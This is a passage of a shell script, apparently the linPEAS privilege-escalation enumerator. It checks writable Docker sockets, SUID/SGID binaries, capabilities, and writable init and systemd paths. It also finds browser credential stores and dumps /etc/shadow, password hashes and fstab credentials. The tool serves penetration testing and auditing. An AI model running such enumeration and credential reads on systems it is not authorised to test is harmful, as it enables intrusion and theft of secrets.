  printf $B"[i] "$Y"https://book.hacktricks.xyz/linux-unix/privilege-escalation/runc-privilege-escalation\n"$NC
  runc=`command -v runc`
  if [ "$runc" ]; then
    echo "runc was found in $runc, you may be able to escalate privileges with it" | sed -${E} "s,.*,${C}[1;31m&${C}[0m,"
  fi
  echo ""

  #-- SI) Docker
  printf $Y"[+] "$GREEN"Searching docker files\n"$NC
  printf $B"[i] "$Y"https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-docker-socket\n"$NC
  dockerfiles=$(echo "$FIND_HOME\n$FIND_ETC\n$FIND_VAR\n$FIND_TMP\n$FIND_OPT\n$FIND_USR\n$FIND_MNT\n$FIND_RUN\n$FIND_PRIVATE\n$FIND_APPLICATIONS" | grep -E 'docker.socket|docker.sock|Dockerfile|docker-compose.yml')
  printf "$dockerfiles\n" | while read f; do
    ls -l "$f" 2>/dev/null
    if [ -S "$f" ] && [ -w "$f" ]; then
      echo "Docker socket file ($f) is writable" | sed -${E} "s,.*,${C}[1;31;103m&${C}[0m,"
    fi
  done
  echo ""

  #-- SI) Firefox files
  printf $Y"[+] "$GREEN"Interesting Firefox Files\n"$NC
  printf $B"[i] "$Y"https://book.hacktricks.xyz/forensics/basic-forensics-esp/browser-artifacts#firefox\n"$NC
  firefoxdirs=$(echo "$FIND_DIR_HOME" | grep -E '\.mozilla')
  printf "$firefoxdirs\n" | while read f; do
    if [ "$f" ]; then
      echo "Found $f"
      find "$f" -name "places.sqlite" -o -name "bookmarkbackups" -o -name "formhistory.sqlite" -o -name "handlers.json" -o -name "persdict.dat" -o -name "addons.json" -o -name "cookies.sqlite" -o -name "cache2" -o -name "startupCache" -o -name "favicons.sqlite" -o -name "prefs.js" -o -name "downloads.sqlite" -o -name "thumbnails" -o -name "logins.json" -o -name "key4.db" -o -name "key3.db" 2>/dev/null | sort
    fi
  done
  echo ""
  
  #-- SI) Chrome files
  printf $Y"[+] "$GREEN"Interesting Chrome Files\n"$NC
  printf $B"[i] "$Y"https://book.hacktricks.xyz/forensics/basic-forensics-esp/browser-artifacts#firefox\n"$NC
  chromedirs=$(echo "$FIND_DIR_HOME" | grep -E 'google-chrome')
  printf "$chromedirs\n" | while read f; do
    if [ "$f" ]; then
      echo "Found $f"
      find "$f" -name "History" -o -name "Cookies" -o -name "Cache" -o -name "Bookmarks" -o -name "Web Data" -o -name "Favicons" -o -name "Login Data" -o -name "Current Session" -o -name "Current Tabs" -o -name "Last Session" -o -name "Last Tabs" -o -name "Extensions" -o -name "Thumbnails" 2>/dev/null | sort
    fi
  done
  echo ""

  #-- SI) Autologin files
  printf $Y"[+] "$GREEN"Autologin Files\n"$NC
  autologinfiles=$(echo "$FIND_HOME\n$FIND_ETC\n$FIND_VAR\n$FIND_MNT" | grep -E 'autologin|autologin.conf')
  printf "$autologinfiles\n" | while read f; do
    echo "$f"
    ls -l "$f" 2>/dev/null | sed "s,passwd,${C}[1;31m&${C}[0m,"
    cat "$f" 2>/dev/null | sed "s,passwd,${C}[1;31m&${C}[0m,"
    echo ""
  done
  echo ""

  #-- SI) S/Key athentication
  printf $Y"[+] "$GREEN"S/Key authentication\n"$NC
  if [ "`grep auth= /etc/login.conf 2>/dev/null | grep -v \"^#\" | grep skey`" ]; then
    printf "System supports$RED S/Key$NC authentication\n"
    if ! [ -d /etc/skey/ ]; then
      echo "${GREEN}S/Key authentication enabled, but has not been initialized"
    elif [ -w /etc/skey/ ]; then
      echo "${RED}/etc/skey/ is writable by you"
      ls -ld /etc/skey/
    else
      ls -ld /etc/skey/ 2>/dev/null
    fi
  fi
  echo ""

  #-- SI) YubiKey athentication
  printf $Y"[+] "$GREEN"YubiKey authentication\n"$NC
  if [ "`grep auth= /etc/login.conf 2>/dev/null | grep -v \"^#\" | grep yubikey`" ]; then
    printf "System supports$RED YubiKey$NC authentication\n"
    if [ -w /var/db/yubikey/ ]; then
      echo "${RED}/var/db/yubikey/ is writable by you"
      ls -ld /var/db/yubikey/ 
    else
      ls -ld /var/db/yubikey/ 2>/dev/null
    fi
  fi
  echo ""

  #-- SI) Passwords inside pam.d
  printf $Y"[+] "$GREEN"Passwords inside pam.d\n"$NC
  grep -Ri "passwd" /etc/pam.d/ 2>/dev/null | grep -v ":#" | sed "s,passwd,${C}[1;31m&${C}[0m,"
  echo ""
  echo ""

  if [ "$WAIT" ]; then echo "Press enter to continue"; read "asd"; fi
fi


if [ "`echo $CHECKS | grep IntFiles`" ]; then
  ###########################################
  #----------) Interesting files (----------#
  ###########################################
  printf $B"════════════════════════════════════╣ "$GREEN"Interesting Files"$B" ╠════════════════════════════════════\n"$NC

  ##-- IF) SUID
  printf $Y"[+] "$GREEN"SUID - Check easy privesc, exploits and write perms\n"$NC
  printf $B"[i] "$Y"https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid\n"$NC
  if ! [ "$STRINGS" ]; then
    echo_not_found "strings"
  fi
  if ! [ "$STRACE" ]; then
    echo_not_found "strace"
  fi
  find / -perm -4000 -type f 2>/dev/null | xargs ls -lahtr | while read s; do
    sname="`echo \"$s\" | awk '{print $9}'`"
    if [ -O "$sname" ]; then
      echo "You own the SUID file: $sname" | sed -${E} "s,.*,${C}[1;31m&${C}[0m,"
    elif [ -w "$sname" ]; then #If write permision, win found (no check exploits)
      echo "You can write SUID file: $sname" | sed -${E} "s,.*,${C}[1;31;103m&${C}[0m,"
    else
      c="a"
      for b in $sidB; do
        if [ "`echo $s | grep $(echo $b | cut -d % -f 1)`" ]; then
          echo "$s" | sed -${E} "s,$(echo $b | cut -d % -f 1),${C}[1;31m&  --->  $(echo $b | cut -d % -f 2)${C}[0m,"
          c=""
          break;
        fi
      done;
      if [ "$c" ]; then
        if [ "`echo \"$s\" | grep -E \"$sidG1\"`" ] || [ "`echo \"$s\" | grep -E \"$sidG2\"`" ] || [ "`echo \"$s\" | grep -E \"$sidVB\"`" ]; then
          echo "$s" | sed -${E} "s,$sidG1,${C}[1;32m&${C}[0m," | sed -${E} "s,$sidG2,${C}[1;32m&${C}[0m," | sed -${E} "s,$sidVB,${C}[1;31;103m&${C}[0m,"
        else
          echo "$s" | sed -${E} "s,/.*,${C}[1m&${C}[0m,"
          printf $ITALIC
          if [ "$STRINGS" ]; then
            $STRINGS "$sname" 2>/dev/null | sort | uniq | while read sline; do
              sline_first="`echo \"$sline\" | cut -d ' ' -f1`"
              if [ "`echo \"$sline_first\" | grep -Ev \"$cfuncs\"`" ]; then
                if [ "`echo \"$sline_first\" | grep \"/\"`" ] && [ -f "$sline_first" ]; then #If a path
                  if [ -O "$sline_first" ] || [ -w "$sline_first" ]; then #And modifiable
                    printf "$ITALIC  --- It looks like $RED$sname$NC$ITALIC is using $RED$sline_first$NC$ITALIC and you can modify it (strings line: $sline) (https://tinyurl.com/suidpath)\n"
                  fi
                else #If not a path
                  if [ ${#sline_first} -gt 2 ] && [ "`command -v \"$sline_first\" 2>/dev/null | grep '/' `" ] && [ "`echo \"$sline_first\" | grep -v \"..\" `" ]; then #Check if existing binary
                    printf "$ITALIC  --- It looks like $RED$sname$NC$ITALIC is executing $RED$sline_first$NC$ITALIC and you can impersonate it (strings line: $sline) (https://tinyurl.com/suidpath)\n"
                  fi
                fi
              fi
            done
            if [ "$TIMEOUT" ] && [ "$STRACE" ] && ! [ "$NOTEXPORT" ] && [ -x "$sname" ]; then
              printf $ITALIC
              echo "----------------------------------------------------------------------------------------"
              echo "  --- Trying to execute $sname with strace in order to look for hijackable libraries..."
              timeout 2 "$STRACE" "$sname" 2>&1 | grep -i -E "open|access|no such file" | sed -${E} "s,open|access|No such file,${C}[1;31m&${C}[0m$ITALIC,g"
              printf $NC
              echo "----------------------------------------------------------------------------------------"
              echo ""
            fi
          fi
        fi
      fi
    fi
  done;
  echo ""


  ##-- IF) SGID
  printf $Y"[+] "$GREEN"SGID\n"$NC
  printf $B"[i] "$Y"https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid\n"$NC
  find / -perm -2000 -type f 2>/dev/null | xargs ls -lahtr | while read s; do
    sname="`echo \"$s\" | awk '{print $9}'`"
    if [ -O "$sname" ]; then
      echo "You own the SGID file: $sname" | sed -${E} "s,.*,${C}[1;31m&${C}[0m,"
    elif [ -w "$sname" ]; then #If write permision, win found (no check exploits)
      echo "You can write SGID file: $sname" | sed -${E} "s,.*,${C}[1;31;103m&${C}[0m,"
    else
      c="a"
      for b in $sidB; do
        if [ "`echo \"$s\" | grep $(echo \"$b\" | cut -d % -f 1)`" ]; then
          echo "$s" | sed -${E} "s,$(echo \"$b\" | cut -d % -f 1),${C}[1;31m&  --->  $(echo $b | cut -d % -f 2)${C}[0m,"
          c=""
          break;
        fi
      done;
      if [ "$c" ]; then
        if [ "`echo \"$s\" | grep -E \"$sidG1\"`" ] || [ "`echo \"$s\" | grep -E \"$sidG2\"`" ] || [ "`echo \"$s\" | grep -E \"$sidVB\"`" ]; then
          echo "$s" | sed -${E} "s,$sidG1,${C}[1;32m&${C}[0m," | sed -${E} "s,$sidG2,${C}[1;32m&${C}[0m," | sed -${E} "s,$sidVB,${C}[1;31;103m&${C}[0m,"
        else
          echo "$s" | sed -${E} "s,/.*,${C}[1m&${C}[0m,"
          printf $ITALIC
          if [ "$STRINGS" ]; then
            $STRINGS "$sname" | sort | uniq | while read sline; do
              sline_first="`echo \"$sline\" | cut -d ' ' -f1`"
              if [ "`echo \"$sline_first\" | grep -Ev \"$cfuncs\"`" ]; then
                if [ "`echo \"$sline_first\" | grep \"/\"`" ] && [ -f "$sline_first" ]; then #If a path
                  if [ -O "$sline_first" ] || [ -w "$sline_first" ]; then #And modifiable
                    printf "$ITALIC  --- It looks like $RED$sname$NC$ITALIC is using $RED$sline_first$NC$ITALIC and you can modify it (strings line: $sline)\n"
                  fi
                else #If not a path
                  if [ ${#sline_first} -gt 2 ] && [ "`command -v \"$sline_first\" 2>/dev/null | grep '/' `" ]; then #Check if existing binary
                    printf "$ITALIC  --- It looks like $RED$sname$NC$ITALIC is executing $RED$sline_first$NC$ITALIC and you can impersonate it (strings line: $sline)\n"
                  fi
                fi
              fi
            done
            if [ "$TIMEOUT" ] && [ "$STRACE" ] && [ ! "$SUPERFAST" ]; then
              printf $ITALIC
              echo "  --- Trying to execute $sname with strace in order to look for hijackable libraries..."
              timeout 2 "$STRACE" "$sname" 2>&1 | grep -i -E "open|access|no such file" | sed -${E} "s,open|access|No such file,${C}[1;31m&${C}[0m$ITALIC,g"
              printf $NC
              echo ""
            fi
          fi
        fi
      fi
    fi
  done;
  echo ""

  ##-- IF) Misconfigured ld.so
  printf $Y"[+] "$GREEN"Checking misconfigurations of ld.so\n"$NC
  printf $B"[i] "$Y"https://book.hacktricks.xyz/linux-unix/privilege-escalation#ld-so\n"$NC
  printf $ITALIC"/etc/ld.so.conf\n"$NC;
  cat /etc/ld.so.conf 2>/dev/null | sed -${E} "s,$Wfolders,${C}[1;31;103m&${C}[0m,g"
  cat /etc/ld.so.conf 2>/dev/null | while read l; do
    if [ "`echo \"$l\" | grep include`" ]; then
      ini_path="`echo \"$l\" | cut -d " " -f 2`"
      fpath="`dirname \"$ini_path\"`"
      if [ "`find \"$fpath\" -type f '(' '(' -user $USER ')' -or '(' -perm -o=w ')' -or  '(' -perm -g=w -and '(' $wgroups ')' ')' ')' 2>/dev/null`" ]; then echo "You have write privileges over `find \"$fpath\" -type f '(' '(' -user $USER ')' -or '(' -perm -o=w ')' -or  '(' -perm -g=w -and '(' $wgroups ')' ')' ')' 2>/dev/null`" | sed -${E} "s,.*,${C}[1;31;103m&${C}[0m,"; fi
      printf $ITALIC"$fpath\n"$NC | sed -${E} "s,$Wfolders,${C}[1;31;103m&${C}[0m,g"
      for f in $fpath/*; do
        printf $ITALIC"  $f\n"$NC | sed -${E} "s,$Wfolders,${C}[1;31;103m&${C}[0m,g"
        cat "$f" | grep -v "^#" | sed -${E} "s,$ldsoconfdG,${C}[1;32m&${C}[0m," | sed -${E} "s,$Wfolders,${C}[1;31;103m&${C}[0m,g"
      done
    fi
  done
  echo ""

  ##-- IF) Capabilities
  printf $Y"[+] "$GREEN"Capabilities\n"$NC
  printf $B"[i] "$Y"https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities\n"$NC
  echo "Current capabilities:"
  (capsh --print 2>/dev/null | grep "Current:" | sed -${E} "s,$capsB,${C}[1;31;103m&${C}[0m," ) || echo_not_found "capsh"
  (cat "/proc/$$/status" | grep Cap | sed -${E} "s,.*0000000000000000|CapBnd:	0000003fffffffff,${C}[1;32m&${C}[0m,") 2>/dev/null || echo_not_found "/proc/$$/status"
  echo ""
  echo "Shell capabilities:"
  (capsh --decode=0x"`cat \"/proc/$PPID/status\" 2>/dev/null | grep \"CapEff\" | awk '{print $2}'`" 2>/dev/null) || echo_not_found "capsh"
  (cat "/proc/$PPID/status" | grep Cap | sed -${E} "s,.*0000000000000000|CapBnd:	0000003fffffffff,${C}[1;32m&${C}[0m,") 2>/dev/null || echo_not_found "/proc/$PPID/status"
  echo ""
  echo "Files with capabilities:"
  getcap -r / 2>/dev/null | while read cb; do
    echo "$cb" | sed -${E} "s,$sudocapsB,${C}[1;31m&${C}[0m," | sed -${E} "s,$capsB,${C}[1;31m&${C}[0m,"
    if [ -w "`echo \"$cb\" | cut -d \" \" -f1`" ]; then
      echo "$cb is writable" | sed -${E} "s,.*,${C}[1;31m&${C}[0m,"
    fi
  done
  echo ""

  ##-- IF) Users with capabilities
  printf $Y"[+] "$GREEN"Users with capabilities\n"$NC
  printf $B"[i] "$Y"https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities\n"$NC
  if [ -f "/etc/security/capability.conf" ]; then
    grep -v '^#\|none\|^$' /etc/security/capability.conf 2>/dev/null | sed -${E} "s,$sh_usrs,${C}[1;96m&${C}[0m," | sed -${E} "s,$nosh_usrs,${C}[1;34m&${C}[0m," | sed -${E} "s,$knw_usrs,${C}[1;32m&${C}[0m," | sed "s,$USER,${C}[1;31m&${C}[0m,"
  else echo_not_found "/etc/security/capability.conf"
  fi
  echo ""

  ##-- IF) Files with ACLs
  printf $Y"[+] "$GREEN"Files with ACLs\n"$NC
  printf $B"[i] "$Y"https://book.hacktricks.xyz/linux-unix/privilege-escalation#acls\n"$NC
  ((getfacl -t -s -R -p /bin /etc $HOMESEARCH /opt /sbin /usr /tmp /root 2>/dev/null) || echo_not_found "files with acls in searched folders" ) | sed -${E} "s,$sh_usrs,${C}[1;96m&${C}[0m," | sed -${E} "s,$nosh_usrs,${C}[1;34m&${C}[0m," | sed -${E} "s,$knw_usrs,${C}[1;32m&${C}[0m," | sed "s,$USER,${C}[1;31m&${C}[0m,"
  echo ""
  
  ##-- IF) .sh files in PATH
  printf $Y"[+] "$GREEN".sh files in path\n"$NC
  printf $B"[i] "$Y"https://book.hacktricks.xyz/linux-unix/privilege-escalation#script-binaries-in-path\n"$NC
  echo $PATH | tr ":" "\n" | while read d; do 
    for f in `find "$d" -name "*.sh" 2>/dev/null`; do
      if [ -O "$f" ]; then
        echo "You own the script: $f" | sed -${E} "s,.*,${C}[1;31m&${C}[0m,"
      elif [ -w "$f" ]; then #If write permision, win found (no check exploits)
        echo "You can write script: $f" | sed -${E} "s,.*,${C}[1;31;103m&${C}[0m,"
      else
        echo $f | sed -${E} "s,$shscripsG,${C}[1;32m&${C}[0m," | sed -${E} "s,$Wfolders,${C}[1;31m&${C}[0m,"; 
      fi
    done
  done
  echo ""

  ##-- IF) Unexpected folders in /
  printf $Y"[+] "$GREEN"Unexpected in root\n"$NC
  if [ "$MACPEAS" ]; then
    (find / -maxdepth 1 | grep -Ev "$commonrootdirsMacG" | sed -${E} "s,.*,${C}[1;31m&${C}[0m,") || echo_not_found
  else
    (find / -maxdepth 1 | grep -Ev "$commonrootdirsG" | sed -${E} "s,.*,${C}[1;31m&${C}[0m,") || echo_not_found
  fi
  echo ""

  ##-- IF) Files (scripts) in /etc/profile.d/
  printf $Y"[+] "$GREEN"Files (scripts) in /etc/profile.d/\n"$NC
  printf $B"[i] "$Y"https://book.hacktricks.xyz/linux-unix/privilege-escalation#profiles-files\n"$NC
  if [ ! "$MACPEAS" ]; then #Those folders don´t exist on a MacOS
    (ls -la /etc/profile.d/ 2>/dev/null | sed -${E} "s,$profiledG,${C}[1;32m&${C}[0m,") || echo_not_found "/etc/profile.d/"
    if [ -w "/etc/profile" ]; then echo "You can modify /etc/profile" | sed -${E} "s,.*,${C}[1;31;103m&${C}[0m,"; fi
    if [ -w "/etc/profile.d/" ]; then echo "You have write privileges over /etc/profile.d/" | sed -${E} "s,.*,${C}[1;31;103m&${C}[0m,"; fi
    if [ "`find /etc/profile.d/ '(' '(' -user $USER ')' -or '(' -perm -o=w ')' -or  '(' -perm -g=w -and '(' $wgroups ')' ')' ')' 2>/dev/null`" ]; then echo "You have write privileges over `find /etc/profile.d/ '(' '(' -user $USER ')' -or '(' -perm -o=w ')' -or  '(' -perm -g=w -and '(' $wgroups ')' ')' ')'`" | sed -${E} "s,.*,${C}[1;31;103m&${C}[0m,"; fi
  fi
  echo ""

   ##-- IF) Files (scripts) in /etc/init.d/
  printf $Y"[+] "$GREEN"Permissions in init, init.d, systemd, and rc.d\n"$NC
  printf $B"[i] "$Y"https://book.hacktricks.xyz/linux-unix/privilege-escalation#init-init-d-systemd-and-rc-d\n"$NC
  if [ ! "$MACPEAS" ]; then #Those folders don´t exist on a MacOS
    if [ -w "/etc/init/" ]; then echo "You have write privileges over /etc/init/" | sed -${E} "s,.*,${C}[1;31;103m&${C}[0m,"; fi
    if [ "`find /etc/init/ -type f '(' '(' -user $USER ')' -or '(' -perm -o=w ')' -or  '(' -perm -g=w -and '(' $wgroups ')' ')' ')' 2>/dev/null`" ]; then echo "You have write privileges over `find /etc/init/ -type f '(' '(' -user $USER ')' -or '(' -perm -o=w ')' -or  '(' -perm -g=w -and '(' $wgroups ')' ')' ')'`" | sed -${E} "s,.*,${C}[1;31;103m&${C}[0m,"; fi
    if [ -w "/etc/init.d/" ]; then echo "You have write privileges over /etc/init.d/" | sed -${E} "s,.*,${C}[1;31;103m&${C}[0m,"; fi
    if [ "`find /etc/init.d/ -type f '(' '(' -user $USER ')' -or '(' -perm -o=w ')' -or  '(' -perm -g=w -and '(' $wgroups ')' ')' ')' 2>/dev/null`" ]; then echo "You have write privileges over `find /etc/init.d/ -type f '(' '(' -user $USER ')' -or '(' -perm -o=w ')' -or  '(' -perm -g=w -and '(' $wgroups ')' ')' ')'`" | sed -${E} "s,.*,${C}[1;31;103m&${C}[0m,"; fi
    if [ -w "/etc/rc.d/init.d" ]; then echo "You have write privileges over /etc/rc.d/init.d" | sed -${E} "s,.*,${C}[1;31;103m&${C}[0m,"; fi
    if [ "`find /etc/rc.d/init.d -type f '(' '(' -user $USER ')' -or '(' -perm -o=w ')' -or  '(' -perm -g=w -and '(' $wgroups ')' ')' ')' 2>/dev/null`" ]; then echo "You have write privileges over `find /etc/rc.d/init.d -type f '(' '(' -user $USER ')' -or '(' -perm -o=w ')' -or  '(' -perm -g=w -and '(' $wgroups ')' ')' ')'`" | sed -${E} "s,.*,${C}[1;31;103m&${C}[0m,"; fi
    if [ -w "/usr/local/etc/rc.d" ]; then echo "You have write privileges over /usr/local/etc/rc.d" | sed -${E} "s,.*,${C}[1;31;103m&${C}[0m,"; fi
    if [ "`find /usr/local/etc/rc.d -type f '(' '(' -user $USER ')' -or '(' -perm -o=w ')' -or  '(' -perm -g=w -and '(' $wgroups ')' ')' ')' 2>/dev/null`" ]; then echo "You have write privileges over `find /usr/local/etc/rc.d -type f '(' '(' -user $USER ')' -or '(' -perm -o=w ')' -or  '(' -perm -g=w -and '(' $wgroups ')' ')' ')'`" | sed -${E} "s,.*,${C}[1;31;103m&${C}[0m,"; fi
    if [ -w "/etc/rc.d" ]; then echo "You have write privileges over /etc/rc.d" | sed -${E} "s,.*,${C}[1;31;103m&${C}[0m,"; fi
    if [ "`find /etc/rc.d -type f '(' '(' -user $USER ')' -or '(' -perm -o=w ')' -or  '(' -perm -g=w -and '(' $wgroups ')' ')' ')' 2>/dev/null`" ]; then echo "You have write privileges over `find /etc/rc.d -type f '(' '(' -user $USER ')' -or '(' -perm -o=w ')' -or  '(' -perm -g=w -and '(' $wgroups ')' ')' ')'`" | sed -${E} "s,.*,${C}[1;31;103m&${C}[0m,"; fi
    if [ -w "/etc/systemd/" ]; then echo "You have write privileges over /etc/systemd/" | sed -${E} "s,.*,${C}[1;31;103m&${C}[0m,"; fi
    if [ "`find /etc/systemd/ -type f '(' '(' -user $USER ')' -or '(' -perm -o=w ')' -or  '(' -perm -g=w -and '(' $wgroups ')' ')' ')' 2>/dev/null`" ]; then echo "You have write privileges over `find /etc/systemd/ -type f '(' '(' -user $USER ')' -or '(' -perm -o=w ')' -or  '(' -perm -g=w -and '(' $wgroups ')' ')' ')'`" | sed -${E} "s,.*,${C}[1;31;103m&${C}[0m,"; fi
    if [ -w "/lib/systemd/" ]; then echo "You have write privileges over /lib/systemd/" | sed -${E} "s,.*,${C}[1;31;103m&${C}[0m,"; fi
    if [ "`find /lib/systemd/ -type f '(' '(' -user $USER ')' -or '(' -perm -o=w ')' -or  '(' -perm -g=w -and '(' $wgroups ')' ')' ')' 2>/dev/null`" ]; then echo "You have write privileges over `find /lib/systemd/ -type f '(' '(' -user $USER ')' -or '(' -perm -o=w ')' -or  '(' -perm -g=w -and '(' $wgroups ')' ')' ')'`" | sed -${E} "s,.*,${C}[1;31;103m&${C}[0m,"; fi
  fi
  echo ""

  ##-- IF) Hashes in passwd file
  printf $Y"[+] "$GREEN"Hashes inside passwd file? ........... "$NC
  if [ "`grep -v '^[^:]*:[x\*\!]\|^#\|^$' /etc/passwd /etc/master.passwd /etc/group 2>/dev/null`" ]; then grep -v '^[^:]*:[x\*]\|^#\|^$' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null | sed -${E} "s,.*,${C}[1;31m&${C}[0m,"
  else echo_no
  fi

  ##-- IF) Writable in passwd file
  printf $Y"[+] "$GREEN"Writable passwd file? ................ "$NC
  if [ -w "/etc/passwd" ]; then echo "/etc/passwd is writable" | sed -${E} "s,.*,${C}[1;31;103m&${C}[0m,"
  elif [ -w "/etc/pwd.db" ]; then echo "/etc/pwd.db is writable" | sed -${E} "s,.*,${C}[1;31;103m&${C}[0m,"
  elif [ -w "/etc/master.passwd" ]; then echo "/etc/master.passwd is writable" | sed -${E} "s,.*,${C}[1;31;103m&${C}[0m,"
  else echo_no
  fi

  ##-- IF) Credentials in fstab
  printf $Y"[+] "$GREEN"Credentials in fstab/mtab? ........... "$NC
  if [ "`grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null`" ]; then grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null | sed -${E} "s,.*,${C}[1;31m&${C}[0m,"
  else echo_no
  fi

  ##-- IF) Read shadow files
  printf $Y"[+] "$GREEN"Can I read shadow files? ............. "$NC
  if [ "`cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db 2>/dev/null`" ]; then cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db 2>/dev/null | sed -${E} "s,.*,${C}[1;31m&${C}[0m,"
  else echo_no
  fi

  ##-- IF) Read opasswd file
  printf $Y"[+] "$GREEN"Can I read opasswd file? ............. "$NC
  if [ -r "/etc/security/opasswd" ]; then cat /etc/security/opasswd 2>/dev/null || echo ""
  else echo_no
  fi

  ##-- IF) network-scripts
  printf $Y"[+] "$GREEN"Can I write in network-scripts? ...... "$NC
  if [ -w "/etc/sysconfig/network-scripts/" ]; then echo "You have write privileges on /etc/sysconfig/network-scripts/" | sed -${E} "s,.*,${C}[1;31;103m&${C}[0m,"
  elif [ "`find /etc/sysconfig/network-scripts/ '(' -not -type l -and '(' '(' -user $USER ')' -or '(' -perm -o=w ')' -or  '(' -perm -g=w -and '(' $wgroups ')' ')' ')' ')' 2>/dev/null`" ]; then echo "You have write privileges on `find /etc/sysconfig/network-scripts/ '(' -not -type l -and '(' '(' -user $USER ')' -or '(' -perm -o=w ')' -or  '(' -perm -g=w -and '(' $wgroups ')' ')' ')' ')' 2>/dev/null`" | sed -${E} "s,.*,${C}[1;31;103m&${C}[0m,"
  else echo_no
  fi

  ##-- IF) Read root dir
  printf $Y"[+] "$GREEN"Can I read root folder? .............. "$NC
  (ls -al /root/ 2>/dev/null) || echo_no
  echo ""
  
  ##-- IF) Root files in home dirs
  printf $Y"[+] "$GREEN"Searching root files in home dirs (limit 30)\n"$NC
  (find $HOMESEARCH /Users -user root 2>/dev/null | head -n 30 | sed -${E} "s,$sh_usrs,${C}[1;96m&${C}[0m," | sed "s,$USER,${C}[1;31m&${C}[0m,") || echo_not_found
  echo ""

  ##-- IF) Others files in my dirs
  if ! [ "$IAMROOT" ]; then
    printf $Y"[+] "$GREEN"Searching folders owned by me containing others files on it\n"$NC
    (find / -type d -user "$USER" -d 1 -not -path "/proc/*" 2>/dev/null | while read d; do find "$d" -maxdepth 1 ! -user "$USER" -exec dirname {} \; 2>/dev/null; done) | sort | uniq | sed -${E} "s,$sh_usrs,${C}[1;96m&${C}[0m," | sed -${E} "s,$nosh_usrs,${C}[1;34m&${C}[0m," | sed -${E} "s,$knw_usrs,${C}[1;32m&${C}[0m,g" | sed "s,$USER,${C}[1;95m&${C}[0m,g" | sed "s,root,${C}[1;13m&${C}[0m,g"
    echo ""
  fi

  ##-- IF) Readable files belonging to root and not world readable
  if ! [ "$IAMROOT" ]; then
    printf $Y"[+] "$GREEN"Readable files belonging to root and readable by me but not world readable\n"$NC
    (find / -type f -user root ! -perm -o=r 2>/dev/null | grep -v "\.journal" | while read f; do if [ -r "$f" ]; then ls -l "$f" 2>/dev/null | sed -${E} "s,/.*,${C}[1;31m&${C}[0m,"; fi; done) || echo_not_found
    echo ""
  fi
  
  ##-- IF) Modified interesting files into specific folders in the last 5mins 
  printf $Y"[+] "$GREEN"Modified interesting files in the last 5mins (limit 100)\n"$NC
  find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" ! -path "/private/var/*" 2>/dev/null | grep -v "/linpeas" | head -n 100 | sed -${E} "s,$Wfolders,${C}[1;31m&${C}[0m,"
  echo ""

  ##-- IF) Writable log files
  printf $Y"[+] "$GREEN"Writable log files (logrotten) (limit 100)\n"$NC
  printf $B"[i] "$Y"https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation\n"$NC
  logrotate --version 2>/dev/null || echo_not_found "logrotate"
  lastWlogFolder="ImPOsSiBleeElastWlogFolder"
  logfind=`find / -type f -name "*.log" -o -name "*.log.*" 2>/dev/null | awk -F/ '{line_init=$0; if (!cont){ cont=0 }; $NF=""; act=$0; if (act == pre){(cont += 1)} else {cont=0}; if (cont < 3){ print line_init; }; if (cont == "3"){print "#)You_can_write_more_log_files_inside_last_directory"}; pre=act}' | head -n 100`
  printf "$logfind\n" | while read log; do
    if [ -w "$log" ] || [ `echo "$log" | grep -E "$Wfolders"` ]; then #Only print info if something interesting found
      if [ "`echo \"$log\" | grep \"You_can_write_more_log_files_inside_last_directory\"`" ]; then printf $ITALIC"$log\n"$NC;
      elif [ -w "$log" ] && [ "`command -v logrotate 2>/dev/null`" ] && [ "`logrotate --version 2>&1 | grep -E ' 1| 2| 3.1'`" ]; then printf "Writable:$RED $log\n"$NC; #Check vuln version of logrotate is used and print red in that case
      elif [ -w "$log" ]; then echo "Writable: $log";
      elif [ "`echo \"$log\" | grep -E \"$Wfolders\"`" ] && [ "$log" ] && [ ! "$lastWlogFolder" == "$log" ]; then lastWlogFolder="$log"; echo "Writable folder: $log" | sed -${E} "s,$Wfolders,${C}[1;31m&${C}[0m,g";
      fi
    fi
  done

  echo ""

  ##-- IF) Files inside my home
  printf $Y"[+] "$GREEN"Files inside $HOME (limit 20)\n"$NC
  (ls -la $HOME 2>/dev/null | head -n 23) || echo_not_found
  echo ""

  ##-- IF) Files inside /home
  printf $Y"[+] "$GREEN"Files inside others home (limit 20)\n"$NC
  (find $HOMESEARCH /Users -type f 2>/dev/null | grep -v -i "/"$USER | head -n 20) || echo_not_found
  echo ""

  ##-- IF) Mail applications
  printf $Y"[+] "$GREEN"Searching installed mail applications\n"$NC
  ls /bin /sbin /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin /etc 2>/dev/null | grep -Ewi "$mail_apps"
  echo ""

  ##-- IF) Mails
  printf $Y"[+] "$GREEN"Mails (limit 50)\n"$NC
  (find /var/mail/ /var/spool/mail/ /private/var/mail -type f -ls 2>/dev/null | head -n 50 | sed -${E} "s,$sh_usrs,${C}[1;31m&${C}[0m," | sed -${E} "s,$nosh_usrs,${C}[1;34m&${C}[0m,g" | sed -${E} "s,$knw_usrs,${C}[1;32m&${C}[0m,g" | sed "s,$USER,${C}[1;31m&${C}[0m,g" | sed "s,root,${C}[1;32m&${C}[0m,g") || echo_not_found
  echo ""

  ##-- IF) Backup folders
  printf $Y"[+] "$GREEN"Backup folders\n"$NC
  printf "$backup_folders\n" | while read b ; do 
    ls -ld "$b" 2> /dev/null
    ls -l "$b" 2>/dev/null && echo ""
  done
  echo ""

  ##-- IF) Backup files
  printf $Y"[+] "$GREEN"Backup files\n"$NC
